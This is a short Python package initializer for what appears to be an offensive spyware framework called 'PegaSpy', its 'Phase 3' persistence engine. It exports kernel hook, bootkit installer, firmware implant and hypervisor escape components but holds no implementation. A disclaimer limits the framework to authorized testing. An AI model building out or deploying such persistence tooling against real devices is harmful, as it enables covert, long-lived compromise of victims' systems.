#!/usr/bin/env python3
"""
PegaSpy Phase 3: Persistence Engine

Deep OS-level persistence and control mechanisms.

WARNING: This framework is for authorized security testing only.
Unauthorized use is illegal and unethical.
"""

from .kernel_hooks import KernelHookManager
from .bootkit_installer import BootkitInstaller
from .firmware_implant import FirmwareImplant
from .hypervisor_escape import HypervisorEscape

__all__ = [
    'KernelHookManager',
    'BootkitInstaller',
    'FirmwareImplant',
    'HypervisorEscape'
]

__version__ = '3.0.0'
__author__ = 'PegaSpy Security Research Team'
__license__ = 'Restricted - Authorized Use Only'